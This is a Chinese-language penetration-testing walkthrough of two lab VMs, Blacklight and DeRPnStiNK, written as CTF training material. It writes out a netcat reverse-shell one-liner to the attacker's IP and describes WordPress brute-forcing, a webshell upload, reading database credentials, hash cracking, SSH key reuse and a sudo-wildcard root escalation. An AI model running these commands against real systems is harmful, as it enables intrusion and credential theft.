> 原文链接: https://www.anquanke.com//post/id/152895 


# 渗透测试实战-Blacklight靶机+DeRPnStiNK靶机入侵


                                阅读量   
                                **207748**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0185325fdcbf7319da.jpg)](https://p4.ssl.qhimg.com/t0185325fdcbf7319da.jpg)

## 前言

挺久没更新靶机渗透文章，近期抽点时间继续更新文章，为什么这篇要2个靶机写在一起哪？因为第一个靶机虽然被困了几天但是其实比较简单故就和另外一个前段时间玩的合并在一起发表了….



## 靶机安装/下载

Blacklight靶机下载：[https://pan.baidu.com/s/1n1A7UlgDUHL1RdmXN0CDPw](https://pan.baidu.com/s/1n1A7UlgDUHL1RdmXN0CDPw)<br>
DeRPnStiNK靶机下载：[https://pan.baidu.com/s/1ayCZ17PHxFe71vbldjGW2w](https://pan.baidu.com/s/1ayCZ17PHxFe71vbldjGW2w)

Blacklight靶机IP：172.16.24.92<br>
DeRPnStiNK靶机IP：172.16.24.69<br>
攻击者IP：172.16.24.31<br>[![](https://p0.ssl.qhimg.com/t011d96f013b527a532.png)](https://p0.ssl.qhimg.com/t011d96f013b527a532.png)

[![](https://p3.ssl.qhimg.com/t010fa40ec4867e8877.jpg)](https://p3.ssl.qhimg.com/t010fa40ec4867e8877.jpg)

[![](https://p4.ssl.qhimg.com/t01461973f6c0a75388.png)](https://p4.ssl.qhimg.com/t01461973f6c0a75388.png)

[![](https://p3.ssl.qhimg.com/t01dce676d364b3f171.png)](https://p3.ssl.qhimg.com/t01dce676d364b3f171.png)



## 实战

### <a class="reference-link" name="1.Blacklight%E9%9D%B6%E6%9C%BA"></a>1.Blacklight靶机

老规矩nmap开路,个人习惯直接全端口….<br>[![](https://p3.ssl.qhimg.com/t01e6b9a0a3610eb8ad.png)](https://p3.ssl.qhimg.com/t01e6b9a0a3610eb8ad.png)

通过端口探测可以看到该靶机开启了2个服务端口，一个是80，一个是9072端口，其中9072端口显示未知服务…. 我们还是继续先用80端口作为突破口，<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016a99878bd5232fa1.png)

界面还是比较简单的，我们使用目录爆破工具跑一下看看，小伙伴们可以自选，小弟还是继续使用kali上自带的 dirb (注：前面的文章中经常有小伙伴们说我的XX目录这么爆破不出来等等，个人觉得大家不应该局限于特定一款工具，可以多试几款多收集一些大的字典包)<br>[![](https://p4.ssl.qhimg.com/t016caea085f45b52d1.png)](https://p4.ssl.qhimg.com/t016caea085f45b52d1.png)

简单的探测后可以看到 有个 “robots.txt” 根据经验有这个目录大部分是有价值得…访问看看<br>[![](https://p4.ssl.qhimg.com/t011aafc24caa186cc5.png)](https://p4.ssl.qhimg.com/t011aafc24caa186cc5.png)

得到 flag1.txt blacklight.dict 2个目录<br>[![](https://p0.ssl.qhimg.com/t01811df684bb65c254.png)](https://p0.ssl.qhimg.com/t01811df684bb65c254.png)

[![](https://p1.ssl.qhimg.com/t01e543416e734df5a5.png)](https://p1.ssl.qhimg.com/t01e543416e734df5a5.png)

可以看到我们已经拿到了第一个flag：“fc4c7223964a26b152823d14f129687207e7fe15”，并告诉我们9072的秘密在首页？（“家？”），另外一个相信小伙伴们也看的出肯定是一个密码字典等等子类的<br>
根据提示小弟在这里被卡了好几天…. 收集了该作者的github、blog首页、他写的一些项目啊一些跟MSF官方交流的信息啊等等等等，一个一个去搜索查看关于“9072”的线索结果都一无所获…本来都有点想放弃的，但是看他写的说该靶机说初学者级别，感觉脸上的巴掌印有点红….<br>
最后操起本着都试试的心态，操起“banner-plus”插件探测一下看看,结果有发现…<br>[![](https://p2.ssl.qhimg.com/t01044bf98f84f9432d.png)](https://p2.ssl.qhimg.com/t01044bf98f84f9432d.png)

发现一个 “.help” ？ 那就直接命令 “telnet 172.16.24.92 9072”

[![](https://p4.ssl.qhimg.com/t01ad00da456288d2a9.png)](https://p4.ssl.qhimg.com/t01ad00da456288d2a9.png)

我们跟着提示 输入 “.help”<br>[![](https://p3.ssl.qhimg.com/t0153c52a19ce872f38.png)](https://p3.ssl.qhimg.com/t0153c52a19ce872f38.png)

[![](https://p5.ssl.qhimg.com/t0158e1d9c7a85aa5d7.png)](https://p5.ssl.qhimg.com/t0158e1d9c7a85aa5d7.png)<br>
第一个为读取hash，我们试着用刚刚那个字典破解一下…（其实可以完全不用）<br>[![](https://p2.ssl.qhimg.com/t014d5ab0e7e3635188.png)](https://p2.ssl.qhimg.com/t014d5ab0e7e3635188.png)

我们其实只需要用到 “.exec” 就行了<br>
命令：.exec `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.24.31 5555 &gt;/tmp/f` （外面要加一个”“”）<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014de174c94e0f7cba.png)

注：这里只有2次的命令输入机会，超过了需要重启靶机

可以看到我们已经拿到了shell。。 且权限为root

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ed4ca6489dbd69b3.png)

该靶机完！是不是很简单….

### <a class="reference-link" name="2.DeRPnStiNK%E9%9D%B6%E6%9C%BA"></a>2.DeRPnStiNK靶机

老规矩！nmap开路<br>[![](https://p1.ssl.qhimg.com/t0174b583fc3b5819b3.png)](https://p1.ssl.qhimg.com/t0174b583fc3b5819b3.png)

可以看到开放了多个端口服务，我们还是用80端口作为我们的突破口，使用命令：<br>
curl [http://172.16.24.69](http://172.16.24.69)<br>
拿到第一个flag<br>[![](https://p4.ssl.qhimg.com/t014cf68d0423afbfbf.png)](https://p4.ssl.qhimg.com/t014cf68d0423afbfbf.png)

（注：该flag通过访问网页查看源码是看不到的哦）

下一步还是跟真实渗透环境中一样跑一下目录，<br>[![](https://p2.ssl.qhimg.com/t016052cf018a00554a.png)](https://p2.ssl.qhimg.com/t016052cf018a00554a.png)

可以看到找到了比较多的目录，如“/php”、“/weblog/”等等<br>
我们访问 [http://172.16.24.69/webnotes/info.txt](http://172.16.24.69/webnotes/info.txt)<br>[![](https://p3.ssl.qhimg.com/t0114b272e0f43093c1.png)](https://p3.ssl.qhimg.com/t0114b272e0f43093c1.png)<br>
让我们添加上本地DNS转换，结合上访问“/weblog”目录在浏览器左下角一直在请求连接“derpnstink.local” 如图：<br>[![](https://p0.ssl.qhimg.com/t011be430a934c2639b.png)](https://p0.ssl.qhimg.com/t011be430a934c2639b.png)

那下一步肯定就在 /etc/hosts 里写入地址，如图<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01804621f37712ac72.png)

我们继续访问<br>[![](https://p0.ssl.qhimg.com/t013f7703e6373957d9.png)](https://p0.ssl.qhimg.com/t013f7703e6373957d9.png)

可以看到页面已经能正常访问了，通过前面的目录扫描已经知道它使用的WP搭建的网站，下面我们直接使用wpscan来扫描该web，顺便加载上自己的字典看能不能爆破出账号密码，如图：<br>[![](https://p0.ssl.qhimg.com/t01c285a292f6cc790a.png)](https://p0.ssl.qhimg.com/t01c285a292f6cc790a.png)

[![](https://p5.ssl.qhimg.com/t01ca632316f46d5962.png)](https://p5.ssl.qhimg.com/t01ca632316f46d5962.png)

[![](https://p5.ssl.qhimg.com/t017f8bd3c49d2ac5ef.png)](https://p5.ssl.qhimg.com/t017f8bd3c49d2ac5ef.png)

通过扫描结果可以看到，还是挺幸运的 成功扫描出几个漏洞和爆破出账号密码，都为”admin”,下一步肯定是登陆拿shell，我相信这肯定难不倒聪明的各位，小弟这里使用MSF来帮忙完成（这个模块小弟前面的文章有使用过来，这里就不多说了..），如图：<br>[![](https://p4.ssl.qhimg.com/t014222422cfa5b18d3.png)](https://p4.ssl.qhimg.com/t014222422cfa5b18d3.png)

为了文章演示方便，小弟上个了webshell…<br>
下面我们查看 “wp-config.php” 拿mysql密码<br>[![](https://p1.ssl.qhimg.com/t01249d2346c7eeca44.png)](https://p1.ssl.qhimg.com/t01249d2346c7eeca44.png)

得到账号：”root”,密码：”mysql”<br>
我们在跑目录的时候已经知道 “/php”目录下面就是 phpmyadmin，为了演示方便，小弟使用phpmyadmin来登陆操作<br>[http://derpnstink.local/php/phpmyadmin/index.php](http://derpnstink.local/php/phpmyadmin/index.php)

登陆后在 “wp-posts”拿到flag2

[![](https://p4.ssl.qhimg.com/t013470a6dfd456b190.png)](https://p4.ssl.qhimg.com/t013470a6dfd456b190.png)

flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)

在 “wp-user” 拿到hash密文：“$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41”,<br>[![](https://p1.ssl.qhimg.com/t01ef168bb6a921aec1.png)](https://p1.ssl.qhimg.com/t01ef168bb6a921aec1.png)

可以先辨别一些hash密文的类型<br>[![](https://p5.ssl.qhimg.com/t012499de19cff9c693.png)](https://p5.ssl.qhimg.com/t012499de19cff9c693.png)

下一步肯定是猜解这个密文，小伙伴们可以使用“hashcat”，命令为：<br>
hashcat -a 0 -m 400 xx.hash mima.txt<br>
因小弟电脑未安装GPU补丁程序，故小弟使用john来完成这个工作<br>
得到密码为：wedgie57 账号为：stinky

我们使用得到的账号密码登陆FTP<br>[![](https://p4.ssl.qhimg.com/t016680ab52878ab776.png)](https://p4.ssl.qhimg.com/t016680ab52878ab776.png)成功登陆并得到了2个文件，一个如图为与一个“mrderp”用户对话记录<br>
另一个为 ssh 的登陆密钥,如图：<br>
ftp://[stinky@172.16.24](mailto:stinky@172.16.24).69/files/ssh/ssh/ssh/ssh/ssh/ssh/key.txt<br>[![](https://p2.ssl.qhimg.com/t01071d6c872f68c3cc.png)](https://p2.ssl.qhimg.com/t01071d6c872f68c3cc.png)

我们把密钥复制到本地，然后去登陆ssh,如图：<br>[![](https://p1.ssl.qhimg.com/t0180a794ce0ba1e198.png)](https://p1.ssl.qhimg.com/t0180a794ce0ba1e198.png)

已经成功登陆！（注：此处的key.txt 必须要给足权限，否则无法登陆）<br>
下一步拿flag<br>
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)<br>
我们继续翻目录，在/Documents 下发现一个 “derpissues.pcap”握手包，

我们down下来分析看看，命令：<br>
scp -i key.txt [stinky@172.16.24](mailto:stinky@172.16.24).69:/home/stinky/Documents/derpissues.pcap /tmp/derp.pcap

[![](https://p1.ssl.qhimg.com/t018184cdc3fea09426.png)](https://p1.ssl.qhimg.com/t018184cdc3fea09426.png)

我们载入wireshark分析，拿到“mrderp”密码，如图：<br>[![](https://p4.ssl.qhimg.com/t019eaf052f82a32069.png)](https://p4.ssl.qhimg.com/t019eaf052f82a32069.png)<br>
密码为：“derpderpderpderpderpderpderp”

下面我们切换账号登陆试试<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d830a9fb9ad02b3f.png)<br>
可以看到已经切换成功并在桌面发现一个“helpdesk.log”文件

下面我们试着切换看看能不能成功，输入命令“sudo -l”

[![](https://p5.ssl.qhimg.com/t017124a13be99154c9.png)](https://p5.ssl.qhimg.com/t017124a13be99154c9.png)<br>
出现一个关键词：(ALL) /home/mrderp/binaries/derpy*

本来这个目录下面是没有“/binaries/”目录的，我们可以创建这个目录和前面包含“derpy”的文件，如图：<br>[![](https://p1.ssl.qhimg.com/t01fa2d53069bb62bcb.png)](https://p1.ssl.qhimg.com/t01fa2d53069bb62bcb.png)<br>
并在文件内写入 “/bin/bash” 保存。最后一步就是直接拿root了，<br>
命令为： sudo ./derpy.sh<br>
如图：<br>[![](https://p0.ssl.qhimg.com/t01bb569f4113c5140e.png)](https://p0.ssl.qhimg.com/t01bb569f4113c5140e.png)

成功拿下root权限和flag4！！



## 总结

没什么好说的，这是小弟的联系方式：

```
56477853576b31736345565a656b4a50596c567264316473556c4a4e617a5656566c524f55464a47576d395561314a755456557863565a55546b39686132743556316477616d51774e55685856455a50595773784d315273556c704e617a4656566c525754315a476133705556564a57546b553163565655516b39575230313356477853576b31564d584658625842505a577446656c5178556c5a4e617a56305646524b55464a47634842556258424b54555531635656746145396c617a423456466877595746724e545a5256455a61566b5a4b636c5272556c704e565456565758705354315a4863336c58563342585955553153464e55526b3968624656355647786b526b30774d545a5756453550596c5577656c5256556c5a4f525456565646524354315a47536d395562464a47545655316356647463453957526d743556465a53566b35564e56565856454a51566b644e4d465273556d704e624842565656524b54315a4854586c55563342535457733157464a55546b3553526c563556473078536b31564e58465857476850566b644e64315274634664685254564657587047543256736348465562475247545778734e6c5a596245356c6130593256477853566b35464e5656585748424f5957314e4d4652756345354e617a465656323177543149775658685562464a615a56553152566b7a63464257526c707656477853576b31464e565657625768505957745665465272556c5a4e4d445532576e704b546c5a47566a5655574842475454417852565655566b39574d46563356473177576b35464e584661656b7050566b5a77635652735a455a4e52546c46566c524b54314a48545870554d464a615a5555315656645963453557526c707656473577546b31564e545a5862577850566a425665465177556c706c56545646566c5247576c5a475654425562464a795456553152565655536b396c6255313456473177546d56464e545a5256455a51556b5a7265465272556c704e526e42565632317354315a4762445a5556564a4f5456553152567036526b39575254453156473577546d56724d56565756455a4f5a57747264316457556c5a4f56545678556c524354314a47566a565562464a715457737863565a55556b396862574e3456477453566b31564e58525356454a50595778574e56527463465a4e52545678563152435432567261336858566c4a535454413163567036516d4657526b707956473078566b31724f55565762576850566b5a7265566457556c4a6c5654563056315247546c5a464d54525562464a795454413552565a55526b39695654423556477453566b30774e56565856454a50566b5a6162315273556d354e5654567856323130543256724d545a55566c4a575457733164465255526b39575230307856473177566b31464f55565856454a505957316a654652586345356b4d4455325556524355465a47576d395561314a5754565578635656744d553957526d773256465a53556b35564e486c5356455a50566b5a77633152725a455a4e565455325657313054324a575658645862464a4f545555315657457a634535686255343256473577626b31564e545a5756457050556a4256656c525963465a4e4d4456305646524b54314a47566a5a5562464a615455553163565a74614539575257743456473177595745774d545a535748424f556b5a56655652596345704e526e42565758704354315a4761336c58563342615455553156566455536b3568624842785647746b526b30774d56565756455a50596c5a46656c5177556d704e4d44565656566877546c5a47576d3955626e424f5456553156566474624539574d46563356327853576d56564e55565856455a505957737764315273556c704e5654553257544e77546d567356586855625842575454413153464a55516b39686247773256477453566b31724f555657564570505957747265465177556c4a6c56545678576e704754324673634846556258425354555a7363565a596245356c6131563356327853616b31564e58465456454a505957785665565273556d704e617a46785656524b54315a4762445a5561314a575457733152566b7a634535575254423356477853576d56724d58465757477850556b646a654652586347466856545659556c5247546c4a4756586c556254464b5a57733156565a55516b3957526b563456473577616d56724d545a5256454a68556b5a56655652735a455a4e4d444678566d316f54314a4752586455563342575457733153465655526b39686246707656473577636b31564e55565756457050566b5a7265565257556c5a4e52544532556c5247576c5a48546a5a5562464a71545778734e6c6474634539575230313556465a53546d56464e56685356457051556b5a5665565273556c5a4e566d78565631686f543246724d486c5857484261545555314e6c5a55526b3953526e427756466877636b31564d545a5857477850556b5a56656c5256556c706c525456565758704754314a47526a565562464a715456553556565a55536b39575257743656466877566d56724e58525556455a5059577856656c52746345704e624842465631525354315a485933685562464a68595441784e6c4a55536d46686245707956466877526b31576246565656455a50566b567265566472556c4a4e617a56565646524359564a4756586c55626e424354565a7356565a55546b39695657743456315a53566b30774e58465356455a505957787264315272556c704e565445325632317754315a4661336855626e42575a56553164465255546b3553526c56365647786b526b31564e56565756455a4f5a57745665565272556c4a4e617a5649556c524f546c5a47565870556254464f54555a7756566455556b39686246563556316877563246464e56565756455a5059577856656c525963455a6c617a5646566c524f54324a5662445a55566c4a535454413156566c36536c70686247743356477853576b31724d56565557484250566b56726546527563465a4f5654563056465247576c5a476244525562584257545778734e6c64746245396c6255313456473177595746564e545a5656455a5059577856655652744d55354e4d4446465656524b54315a4756586855625842575a5655314e6c4e55526b3553526c59305646524b556d567363454a5156444139
```

你能破解了出来了吗？坏笑！！ 祝大家生活愉快！
